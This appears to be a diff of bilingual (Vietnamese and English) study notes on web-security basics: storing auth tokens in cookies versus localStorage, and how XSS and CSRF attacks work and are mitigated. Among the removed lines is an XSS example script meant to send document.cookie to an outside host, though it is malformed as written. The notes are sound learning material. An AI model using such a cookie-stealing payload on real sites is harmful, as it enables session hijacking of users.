@@ -1,29 +1,15 @@
-### How it work
+### SLIDES
 
-1. Auth: cookies or localStorage
+1. Slide 1
 
-- Local Storage --> XSS attack
-- Cookies --> CSRF attack
+- unauthorized privilege escalation: leo thang đặc quyền trái phép
+- kiểu tấn công này còn gọi là tấn công mượn quyền trái phép
 
----
-
-Khi login, server trả về token, mình sẽ lưu token ở đâu ? local storage or cookies
-
-- Với cac trang liên quan tới tiền bạc thì nên lưu token hoặc các thông tin ở cookies -> vì nó an toàn hơn local storage
-
-  > XSS Attack: hacker bằng 1 cách nào đó họ embed 1 đoạn malicious code into our website, and user not aware about this and user accidentally execute this code -> _can using **sanitize html** to clean this_
-
-  ```html
-  <script>
-    src = "https://mysite.in?+document.cookie;";
-  </script>
-  ```
-
-  > CSRF Attack: Người dùng vô tình click vào 1 link độc hại (có thể là chuyển tiền) -> với trường hợp này có thể dùng thêm xác thực 2 bước hoặc là phải nhập mã OTP để có thể chuyển tiền
-
----
+- Hiểu 1 cách nôm na Người dùng vô tình click vào 1 link độc hại (có thể là chuyển tiền) -> với trường hợp này có thể dùng thêm xác thực 2 bước hoặc là phải nhập mã OTP để có thể chuyển tiền
 
 **All the CSRF attacks almost related about `cookie`. if your site do not using cookie, ignore this vulnerability**
+
+2. Slide 2
 
 When a user tries to access a site, the browser often automatically includes the credentials in the request, to make the login process more convenient. These credentials may include the user’s session cookie, basic authentication credentials, IP address, and Windows domain credentials.
 
@@ -36,6 +22,10 @@ Either the malicious link itself, or a web page the user visits, triggers a requ
 The request supposedly comes from the user, and takes advantage of the fact that the user is already signed into the website.
 The website acknowledges the request and performs the attacker’s requested action, without the user’s knowledge or consent.
 CSRF attacks typically attempt to change server state, but can also be used to gain access to sensitive data. If an attacker successfully performs a CSRF attack against the victim’s account, they can transfer funds, purchase a product, modify account information such as the shipping address, modify the password, or any other action available when the user is signed in.
+
+3. Slide Example
+
+https://www.hacksplaining.com/lessons
 
 ### Example
 
